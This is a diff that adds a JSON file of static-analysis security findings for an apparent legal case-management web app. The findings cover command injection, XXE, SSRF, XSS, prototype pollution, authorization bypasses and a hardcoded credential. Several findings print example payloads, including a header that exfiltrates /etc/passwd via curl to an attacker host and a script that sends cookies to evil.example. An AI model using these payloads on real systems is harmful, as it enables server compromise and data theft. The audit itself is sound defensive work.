@@ -1,0 +1,357 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "app/render.server.ts",
+      "start": {
+        "line": 40,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 85,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderFilingBrief() interpolates `requestedFormat` directly into a shell command string passed to execSync(). The caller (app/routes/app.matters.$matterId.brief.tsx:30-31) sets requestedFormat straight from the attacker-controlled `x-brief-format` request header with no allow-list or shell-metacharacter sanitization, unlike the sibling renderPracticeAreaGuide() which validates against ALLOWED_GUIDE_FORMATS and uses spawn() with shell:false. Any authenticated user who can view a matter can set e.g. `x-brief-format: html; curl http://attacker/$(cat /etc/passwd) #` to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xxe-custom-entity-expansion",
+      "path": "app/feed.server.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveDeclaredEntities() parses a fetched feed's `<!DOCTYPE ... [<!ENTITY name SYSTEM \"uri\">]>` block and, for `file://` URIs, reads the referenced local file via readFileSync() and substitutes it into the document via &name; (used at line 55 in syncCourtDocketFeed). syncCourtDocketFeed() is reachable from app/routes/app.matters.$matterId.tsx (docket.feed_sync action, line ~595) with a fully attacker-supplied `feedUrl` form field from any staff user with matter-edit access. An attacker can host a feed containing `<!DOCTYPE d [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><item><title>&x;</title>...`, causing the server to read and return the contents of arbitrary local files. This is a hand-rolled XXE implementation (the sibling syncFirmAnnouncementFeed rejects any DOCTYPE outright).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "app/worksheet.server.ts",
+      "start": {
+        "line": 21,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateDamagesWorksheet() extracts `formula:` lines from an uploaded worksheet's free text and evaluates them with `new Function(...Object.keys(context), \\`return (${userFormula});\\`)`. The formula text is taken verbatim from the uploaded document content with no expression whitelist/parser, so it runs as arbitrary JavaScript with access to Node globals (process, require via constructor chains, etc.) in the server process. Any user able to upload a worksheet document can achieve remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.recursive-merge",
+      "path": "app/reportConfig.server.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "mergeConfigLayer() recursively assigns `target[key] = value` for every enumerable key of an attacker-controlled object with no filtering of `__proto__`/`constructor`/`prototype`. applySavedReportView() (line 33) JSON.parses the `view` query-string parameter from app/routes/app.reports._index.tsx (line 17-18, `url.searchParams.get(\"view\")`) and feeds it straight into mergeConfigLayer without the sanitizeConfigOverrides() guard that IS used for applyDigestPreferences(). A request like `/app/reports?view={\"__proto__\":{\"polluted\":\"x\"}}` pollutes the global Object.prototype for the whole Node process, potentially corrupting logic or causing a DoS across all users.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unrestricted-fetch-to-public-dir",
+      "path": "app/exhibits.server.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "pullFiledExhibitCopy() calls fetch(sourceUrl) on a fully attacker-supplied URL (submitted via the `sourceUrl` form field in the exhibit.import action, app/routes/app.matters.$matterId.tsx line 479-481) with no hostname allow-list, unlike its sibling pullRegistryExhibitCopy() which checks against REGISTRY_HOSTNAMES. Any staff user can point this at an internal service or a cloud metadata endpoint (e.g. http://169.254.169.254/...) and the response body is written straight into the public web root (./public/exhibits/), making the fetched content publicly retrievable.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "app/routes/app.clients.$clientId.tsx",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The loader reflects the request's `Origin` header verbatim into `Access-Control-Allow-Origin` and unconditionally sets `Access-Control-Allow-Credentials: true`, for any origin. Combined with the session cookie in app/auth.server.ts (`sameSite: \"none\"`, `secure: true`, line 14-16), any external website can issue a `fetch(..., {credentials:'include'})` request from a logged-in staff member's browser to `/app/clients/:clientId` and read back sensitive client PII (email, phone, address, organization, matters, conflict notes) cross-origin for any clientId, without CSRF protection or an origin allow-list. Contrast with app/subscription.server.ts standingWidgetCorsHeaders(), which checks the Origin against an explicit allow-list.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.unverified-signature-used-for-authorization",
+      "path": "app/routes/referral.$assertion.tsx",
+      "start": {
+        "line": 14,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The referral-packet loader authorizes access to a matter's client PII (name, email, phone) and attorney contact info using `decodeHandoffAssertion(params.assertion!)`, which only base64-decodes the payload and never checks its HMAC signature (unlike `verifyHandoffAssertion`, used correctly elsewhere in app/casedocs.server.ts and app/routes/api.filing-status.tsx). decodeHandoffAssertion's own doc comment states it is 'not used to authorize access on its own', but here it is the sole gate. An attacker can forge an assertion for any matterId (e.g. `base64url({alg:'HS256'}).base64url({matterId:'<any-id>',scope:'referral_packet'}).anything`) and pull the referral packet \u2014 including client name, email, phone, and attorney contact \u2014 for any matter without a valid signature.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-template-literal-into-script-tag",
+      "path": "app/viewer.tsx",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildDocumentPreviewBootstrap() interpolates `documentTitle` and `tags` directly into a `<script>window.__lexoraPreview = { title: \"...\", tags: \"...\" };</script>` string with no escaping of quotes, backslashes, or `</script>`, then renders it via dangerouslySetInnerHTML in DocumentPreviewBootstrap. It is used at app/routes/app.documents.$documentId.tsx:210 with `doc.title`/`doc.tags`, which are free-text fields any user (including a client-portal user, per app.matters.$matterId.documents.new.tsx) can set when uploading a document. A title such as `x\"};</script><script>fetch('https://evil.example/'+document.cookie)</script><script>x={a:\"` breaks out of the string/script context and executes arbitrary JavaScript for anyone who views that document. Contrast with the properly escaped buildMatterOverviewBootstrap()/jsonScriptSafe() further down in the same file.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.dangerously-set-innerhtml-unescaped",
+      "path": "app/richtext.tsx",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPortalSummary() converts `**bold**` markup to `<strong>` but never HTML-escapes the rest of `text` before rendering it via dangerouslySetInnerHTML. It is used in app/routes/app.matters.$matterId.tsx:792 to render `matter.description` for client-portal viewers. Any raw HTML/script in a matter's description (settable by staff, and potentially copied from client-submitted intake text) is rendered unescaped in the client portal, e.g. a description containing `<img src=x onerror=alert(document.cookie)>` executes. The sibling renderStaffSummary() in the same file correctly calls escapeHtml() first \u2014 renderPortalSummary is missing that step.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-path-join",
+      "path": "app/templates.server.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadFilingTemplate() builds a filesystem path with `path.join(FILING_TEMPLATE_DIR, \\`${templateName}.md\\`)` and performs no containment check on the result, unlike the sibling loadPracticeAreaGuideAsset() a few lines below which validates `requested.startsWith(GUIDE_ASSET_DIR + path.sep)`. templateName comes directly from the URL route parameter in app/routes/app.matters.$matterId.filing-templates.$templateName.tsx (any authenticated user who can view the matter), allowing traversal sequences to escape FILING_TEMPLATE_DIR and read arbitrary `.md` files elsewhere on the filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.client-controlled-authorization-bypass",
+      "path": "app/casedocs.server.ts",
+      "start": {
+        "line": 101,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 113,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "lookupCaseStatusForReferringFirm() lifts the sealed-matter (`sensitivity !== 'standard'`) restriction whenever the caller passes `dataLevel === 'full'`, with no signature, token, or origin verification that the caller is actually an onboarded correspondent portal. app/routes/case-status.$reference.tsx (line 16-19) reads `dataLevel` straight from the public, unauthenticated request's query string (`?dataLevel=full`). Any anonymous visitor can therefore bypass the sealed-matter access control and retrieve the status/title of any sealed matter simply by adding `?dataLevel=full` to the public case-status URL.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-unescaped-filter-value",
+      "path": "app/directory.server.ts",
+      "start": {
+        "line": 100,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 105,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "verifyGroupAccess() escapes `groupName` via escapeDirectoryFilterValue() before interpolating it into the LDAP-style filter, but interpolates `memberDN` completely unescaped: `(&(member=${memberDN})(cn=${safeGroup}))`. memberDN is taken directly from the `memberDN` form field in app/routes/app.admin.credentialing.tsx. A value containing filter metacharacters (parentheses) can alter the structure of the compiled filter (see compileFilter/splitClauses), letting a caller manipulate which directory entries are matched by the credentialing-committee clearance check.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-api-credential",
+      "path": "app/notary.server.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 70,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`notaryClientSecret` is a hardcoded API bearer credential for the third-party notary vendor, committed directly in source rather than sourced from an environment variable (contrast with `archivalVendorKey`/`ARCHIVAL_VENDOR_KEY` a few lines below in the same file, which is loaded from process.env). Anyone with source access has a live credential for the notary vendor's API.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection-handlebars",
+      "path": "app/messageTemplates.server.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCustomMessageTemplate() calls Handlebars.compile() on `templateSource`, which is the full template text pasted in by an attorney (not just merge data), then executes the compiled template. This is reachable from app/routes/app.messages._index.tsx's composeMessageFromCustomTemplate(). Compiling attacker-influenced template source (rather than only interpolating data into a fixed, trusted template, as renderStandardMessageTemplate() does with STANDARD_TEMPLATES) is a server-side template injection surface \u2014 Handlebars templates can invoke helpers and traverse object/prototype chains, and untrusted template sources have historically been used to achieve remote code execution against Handlebars.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
